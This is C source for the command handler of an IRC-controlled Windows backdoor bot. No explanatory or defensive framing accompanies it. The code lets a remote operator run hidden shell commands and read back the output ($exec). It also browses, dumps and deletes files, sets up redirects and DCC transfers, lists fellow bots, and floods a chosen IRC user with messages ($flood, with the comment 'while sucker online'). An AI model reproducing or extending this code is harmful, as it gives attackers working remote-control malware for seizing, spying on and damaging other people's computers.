
// input: strv[4], ptrv[4]

void action_bcast(int n)
{
  int prob = 0;
  if (strv[n][0] == 'p')
    prob = atoi(strv[n++]+1);

  if (ptrv[n][0])
    irc_broadcast(prob, "%s\n", ptrv[n]);

} // action_bcast

void action_single(int n)
{
  if (!strcmpi(strv[n], "$bcast"))
  {
    action_bcast(n+1);
    return;
  }

  if (!strcmpi(strv[n], "$quit"))
  {
    irc_send("QUIT :.\n");
    closesocket(irc_socket);
    WSACleanup();
    exit(0);
  }

  if (!strcmpi(strv[n], "$sleep"))
  {
    if (*strv[n+1])
    {
      sleep_setdelta( atoi(strv[n+1]) );
      irc_send("QUIT :.\n");
      irc_error++;
    }
    return;
  }

  if (!strcmpi(strv[n], "$rename"))
  {
    for (;;)
    {
      n++;
      if (strv[n][0])
      {
        auth(strv[n]);
        if (auth_host[0]) continue;
      }
      irc_setnick(strv[n]);
      return;
    }
  }

  if (!strcmpi(strv[n], "$forward"))
  {
    char *d = strv[n+1];
    if (!d[0])
      d = irc_caller;
    else
      if (d[0] == '*')
        d[0] = 0;
    strcpy(irc_forward, d);
    irc_reply("forward set to '%s'\n", irc_forward);
    return;
  }

  if (!strcmpi(strv[n], "$info"))
  {
    if (strv[n+1][0])                   // 2nd param present?
      strcpy(irc_caller, strv[n+1]);    // used by irc_reply()
    action_info();
    return;
  }

  if (!strcmpi(strv[n], "$except"))
  {
    int a = 0, b = 0;
    if (a / b) return;
    return;
  }

  if (!strcmpi(strv[n], "$exec"))
  {
    char t[1024], e[1024];
    ExpandEnvironmentStrings(ptrv[n+1], e, sizeof(e));
    sprintf(t, "c:\\command.com c:\\ /c %s >%s", e, irc_tmpfile);
    irc_reply("executing '%s'\n", t);
    if (irc_error) return;
//  AllocConsole();
    DeleteFile(irc_tmpfile);
    int res = WinExec(t,SW_HIDE);
//  FreeConsole();
    irc_reply("WinExec() result = %i, GetLastError = %i\n", res, GetLastError());
    return;
  }

  if (!strcmpi(strv[n], "$dump"))
  {

    char* d = strv[n+1];
    if (!d[0]) d = irc_tmpfile;
    if (strv[n+2][0])
      strcpy(irc_caller, strv[n+2]);

    do_dump(d);

    return;
  }

  if (!strcmpi(strv[n], "$flood"))
  {
    if (*strv[n+1])
    {
      for (int i=0; i<50; i++)  // change to 'while sucker online'
      {
        irc_send("PRIVMSG %s :FINGER\n", strv[n+1]);
        if (irc_error) return;
      }
      return;
    }
  }

  if (!strcmpi(strv[n], "$brolist"))
  {
    for (int i=0; i<MAXBRO; i++)
      if (bro_nick[i][0])
        irc_reply("%s %s\n",
          bro_nick[i],
          bro_host[i]);
    irc_reply("***\n");
    return;
  }

  if (!strcmpi(strv[n], "$kix0r"))
  {
    if (strc==n+3)
      kix0r(strv[n+1], strv[n+2]);
    return;
  }

  if (!strcmpi(strv[n], "$dir"))
  {
    do_dir(n+1);
    return;
  }

  if (!strcmpi(strv[n], "$ini"))
  {
    ini_cmd(n+1);
    return;
  }

  if (!strcmpi(strv[n], "$dcc"))
  {
    dcc_cmd(n+1);
    return;
  }

  if (!strcmpi(strv[n], "$cd"))
  {
    SetCurrentDirectory(strv[n+1]);
    char buf[1024];
    GetCurrentDirectory(sizeof(buf), buf);
    irc_reply("%s\n", buf);
    return;
  }

  if (!strcmpi(strv[n], "$delete"))
  if (strc==(n+2))
  {
    DeleteFile(strv[n+1]);
    return;
  }

  if (!strcmpi(strv[n], "$redir"))
  {
    redir_cmd(n+1);
    return;
  }

  if (!strcmpi(strv[n], "$servlist"))
  {
    servlist_cmd(n+1);
    return;
  }

  // do single action, [N times]

  int iter = 1;
  if (strv[n][0] == 'x')
    iter = atoi(strv[n++]+1);

  while (iter--)
  {
    irc_send("%s\n", ptrv[n]);
    if (irc_error) return;
  }

} // action_single
